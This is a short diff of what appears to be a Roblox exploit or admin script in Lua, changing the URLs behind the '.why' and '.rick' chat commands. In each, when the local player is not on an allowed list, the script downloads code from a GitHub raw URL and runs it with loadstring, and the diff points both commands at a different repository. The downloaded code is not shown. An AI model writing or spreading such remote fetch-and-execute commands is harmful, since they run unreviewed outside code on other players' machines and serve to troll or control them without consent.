@@ -10464,7 +10464,7 @@ local commands = {
 	end,
 	[".why"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Why"))()
 		end
 	end,
 	[".kick"] = function()
@@ -10477,7 +10477,7 @@ local commands = {
 	end,
 	[".rick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Rick"))()
 		end
 	end,
 	[".freeze"] = function()
